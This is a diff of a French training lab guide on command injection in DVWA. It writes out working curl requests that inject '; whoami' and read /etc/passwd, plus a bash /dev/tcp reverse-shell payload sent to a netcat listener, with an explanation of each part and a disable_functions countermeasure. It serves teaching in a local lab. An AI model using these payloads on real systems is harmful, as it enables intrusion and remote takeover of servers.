@@ -846,72 +846,130 @@ bash labs_resolution/jour-01/restore_sqli.sh
 
 ## LAB-5 — Command Injection + Reverse Shell
 
+### Fiche
+
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
 | 30 min | dvwa :8088 | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell |
 
 ### Contexte technique
 
-La fonction `shell_exec("ping -c 4 " . $target)` exécute tout ce qui suit `ping`. Avec `;`, on chaîne une deuxième commande. Avec un reverse shell, on obtient un shell interactif complet — plus puissant qu'une simple commande.
+La fonction PHP `shell_exec("ping -c 4 " . $target)` colle la variable `$target` directement dans une commande shell. Si `$target = 127.0.0.1; whoami`, le shell reçoit :
 
-### Étape 1 — Command injection basique — [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell
+```
+ping -c 4 127.0.0.1; whoami
+```
 
-**Objectif :** Exécuter des commandes système arbitraires via le champ `ping` de DVWA.
+Le `;` est un séparateur de commandes en bash. Il termine `ping` et enchaîne `whoami`. Résultat : on exécute n'importe quelle commande système.
 
-**Où ?** Terminal 1 — DVWA → Command Injection
+> 💡 **Métacaractères bash :** `;` = séparateur de commandes, `|` = pipe (sortie d'une commande → entrée de la suivante), `&&` = exécute si la précédente a réussi, `||` = exécute si la précédente a échoué. Tous fonctionnent ici.
+
+---
+
+### Étape 1 — CMDi basique (curl) — [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell
+
+**Objectif :** Exécuter des commandes système arbitraires via le paramètre `ip` du formulaire `ping`.
+
+**Où ?** Terminal 1
+
+**Prérequis :** Cookie DVWA valide dans `/tmp/dvwa_cookie.txt` (cf. setup_dvwa.sh).
+
+> 💡 **Où est le formulaire ?** L'outil "Command Injection" de DVWA est à l'URL `/vulnerabilities/exec/`. Il attend un champ `ip` et un bouton `Submit`. La requête est en POST. C'est la même logique que les labs précédents : on envoie une requête HTTP avec le cookie de session.
 
 **Actions :**
-1. Remplacer l'IP cible par `127.0.0.1; whoami`
-2. Le `;` termine la commande `ping` légitime et enchaîne une nouvelle commande
-3. Tester `ls /etc/`, `cat /etc/passwd`
+1. Envoyer une requête POST normale → contenu du ping
+2. Injecter `; whoami` après l'IP → la commande est exécutée
+3. Tester `; ls /etc/`, `; cat /etc/passwd`
 
 **Commande :**
 ```bash
-# Via l'interface web DVWA, dans le champ "Enter an IP address" :
-127.0.0.1; whoami     → www-data
-127.0.0.1; ls /etc/   → contenu du répertoire /etc/
-127.0.0.1; cat /etc/passwd → liste des utilisateurs système
+cd rendu_labs/jour-01
+
+# Test normal : un ping simple
+curl -s -b /tmp/dvwa_cookie.txt \
+  --data "ip=127.0.0.1&Submit=Submit" \
+  "http://localhost:8088/vulnerabilities/exec/" | grep -o "PING\|ping"
+# → PING  (le ping s'exécute normalement)
+
+# Injection : le ; chaîne une deuxième commande
+curl -s -b /tmp/dvwa_cookie.txt \
+  --data "ip=127.0.0.1; whoami&Submit=Submit" \
+  "http://localhost:8088/vulnerabilities/exec/" | grep -o "www-data\|PING"
+# → PING
+# → www-data  (la commande whoami a été exécutée sur le serveur)
+
+# Lire le fichier passwd
+curl -s -b /tmp/dvwa_cookie.txt \
+  --data "ip=127.0.0.1; cat /etc/passwd&Submit=Submit" \
+  "http://localhost:8088/vulnerabilities/exec/" | grep -o "root:x"
+# → root:x  (contenu du fichier passwd)
 ```
 
-**Résultat attendu :** La page affiche le résultat de la commande injectée après le résultat du ping. `whoami` confirme que le serveur web tourne sous l'utilisateur `www-data`.
+**Résultat attendu :** La réponse contient à la fois la sortie de `ping` ET le résultat de la commande injectée (`www-data`, `root:x`, etc.).
 
-**Explication :** La fonction PHP `shell_exec()` passe la chaîne directement au shell système. Toute commande après `;` est exécutée comme une nouvelle commande. D'autres métacaractères fonctionnent aussi : `|` (pipe), `||`, `&&`, `` ` ``.
+**Explication :** PHP fait `shell_exec("ping -c 4 " . $target)`. Avec `ip=127.0.0.1; whoami`, la chaîne exécutée est `ping -c 4 127.0.0.1; whoami`. Le shell exécute `ping`, puis `whoami`. Le résultat des deux commandes est renvoyé dans la réponse HTTP.
 
 ---
 
 ### Étape 2 — Reverse shell — [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell
 
-**Objectif :** Obtenir un shell interactif distant sur le serveur cible via une connexion TCP sortante.
+**Objectif :** Obtenir un **shell interactif** permanent — on tape les commandes sur Kali, elles s'exécutent sur le serveur DVWA.
 
-**Où ?** Terminal 1 (écouteur, à lancer en premier) puis Terminal 2 (injection du payload)
+> 💡 **Pourquoi un reverse shell et pas juste `; whoami` ?** Avec `; whoami`, on exécute une commande à la fois, et on voit le résultat dans la page web. Avec un reverse shell, on a un terminal complet : on peut enchaîner des commandes, naviguer, éditer des fichiers, lancer d'autres outils. C'est bien plus puissant.
+
+**Où ?** Terminal 1 (écouteur) ET Terminal 2 (injection)
 
 **Actions :**
-1. **Terminal 1 :** Lancer un écouteur netcat sur le port `4444`
-2. **Terminal 2 :** Trouver l'IP de l'interface Docker (`docker0`)
-3. **Terminal 2 :** Injecter le payload de reverse shell dans le champ `ping`
+1. **Terminal 1 :** Lancer netcat en écoute sur le port 4444 (À FAIRE **AVANT** l'injection)
+2. **Terminal 2 :** Trouver l'IP de l'hôte Kali sur le réseau Docker
+3. **Terminal 2 :** Injecter le payload reverse shell qui se connecte à notre écouteur
+
+> ⚠️ **Ordre impératif :** L'écouteur (nc) doit être lancé **AVANT** le payload. Sinon le serveur tente de se connecter sur le port 4444, personne n'écoute → connexion refusée → échec.
 
 **Commande :**
 
-*Terminal 1 — écouteur :*
+*Terminal 1 — écouteur netcat :*
 ```bash
 nc -lvnp 4444
-# → Listening on 0.0.0.0:4444 (en attente de connexion...)
+# -l  = listen (mode écoute)
+# -v  = verbose (affiche les connexions entrantes)
+# -n  = pas de DNS (ne pas résoudre les noms d'hôtes)
+# -p  = port (le port à écouter)
+# → Listening on 0.0.0.0:4444
 ```
+Laissez ce terminal ouvert — il attend une connexion.
 
-*Terminal 2 — trouver l'IP docker0 :*
+*Terminal 2 — trouver l'IP Kali sur le réseau Docker :*
 ```bash
 ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
-# → 172.17.0.1 (généralement, selon votre réseau Docker)
+# → 172.17.0.1
+```
+Notez cette IP. Le conteneur DVWA peut joindre l'hôte Kali via cette adresse (interface Docker bridge). Si `docker0` n'existe pas, utilisez `hostname -I | awk '{print $1}'`.
+
+*Terminal 2 — injecter le reverse shell (curl) :*
+```bash
+SESSID=$(grep PHPSESSID /tmp/dvwa_cookie.txt | awk '{print $NF}')
+curl -s -b /tmp/dvwa_cookie.txt \
+  --data "ip=127.0.0.1; bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'&Submit=Submit" \
+  "http://localhost:8088/vulnerabilities/exec/"
 ```
 
-*Terminal 2 — injecter le reverse shell (via l'interface web DVWA) :*
-```
-127.0.0.1; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
-```
+> 🔄 **Adapter l'IP :** Remplacez `172.17.0.1` par l'IP que vous a donné la commande `ip addr show docker0`.
 
-**Résultat attendu :** Dans le Terminal 1, une connexion entrante apparaît : `connect to [KALI_IP] from (UNKNOWN) [172.17.0.2] ...`. Tapez `whoami` → `www-data`.
+**Résultat attendu :**
+- **Terminal 1** (netcat) : `connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] ...`
+- Tapez `whoami` dans le Terminal 1 → réponse `www-data`
+- Tapez `id`, `pwd`, `ls -la /var/www/html/` → le serveur répond
 
-**Explication :** `bash -c` exécute une chaîne shell. `bash -i` démarre un shell interactif. `>& /dev/tcp/<IP>/4444` redirige stdout et stderr vers la socket TCP. `0>&1` redirige stdin (clavier) vers la même socket. Résultat : l'attaquant tape ses commandes localement, elles sont exécutées sur le serveur distant.
+**Explication du payload `bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'` :**
+| Partie | Rôle |
+|--------|------|
+| `bash -c '...'` | Exécute la chaîne entre quotes dans un nouveau bash |
+| `bash -i` | Démarre un shell bash **interactif** (attend des commandes) |
+| `>& /dev/tcp/172.17.0.1/4444` | Redirige **stdout (sortie) et stderr (erreurs)** vers la socket TCP |
+| `0>&1` | Redirige **stdin (entrée clavier)** vers la même socket → nos commandes partent vers le serveur |
+
+> 💡 **`/dev/tcp` n'est PAS un fichier :** C'est une fonctionnalité intégrée de bash. Quand bash voit `/dev/tcp/host/port`, il ouvre une connexion TCP vers `host:port`. Pas besoin de netcat sur le serveur cible.
 
 ---
 
@@ -944,7 +1002,16 @@ curl -s "http://localhost:8088/vulnerabilities/exec/" \
 
 **Résultat attendu :** `shell_exec` affiche `inactif`. La commande `whoami` n'est plus exécutée : `grep -c` retourne `0`.
 
-**Explication :** La directive `disable_functions` empêche PHP d'appeler ces fonctions au runtime. Même si le code vulnérable appelle `shell_exec()`, PHP ne fait rien et retourne `null`. Le payload `;whoami` passe toujours dans la requête, mais le shell système n'est plus invoqué.
+**Explication :** La directive `disable_functions` empêche PHP d'appeler ces fonctions au runtime. Même si le code vulnérable appelle `shell_exec()`, PHP ne fait rien et retourne `null`. Le payload `;whoami` passe toujours dans la requête HTTP, mais le shell système n'est plus invoqué.
+
+### Résultat attendu
+
+- [ ] CMDi basique : `; whoami` retourne `www-data` dans la réponse curl
+- [ ] Reverse shell : connexion netcat reçue, shell interactif avec `www-data`
+- [ ] Contre-mesure : `disable_functions` → `shell_exec` inactif, `grep -c` retourne 0
+- [ ] Comprendre les métacaractères shell (`;`, `|`, `&&`) et leur effet dans `shell_exec()`
+- [ ] Maîtriser le payload reverse shell bash : `/dev/tcp`, redirections `>&` et `0>&1`
+- [ ] Connaître les défenses : `disable_functions`, whitelist de commandes, conteneur non-privilégié
 
 > **☕ Pause recommandée :** Le LAB-6 ci-dessous est le plus long et le plus dense de la journée. Prenez 5-10 minutes avant de l'attaquer — vous allez enchaîner injection SQL sur 3 points d'entrée, extraction automatisée avec sqlmap, et cracking de mots de passe. Un esprit reposé est plus efficace pour analyser les résultats.
 
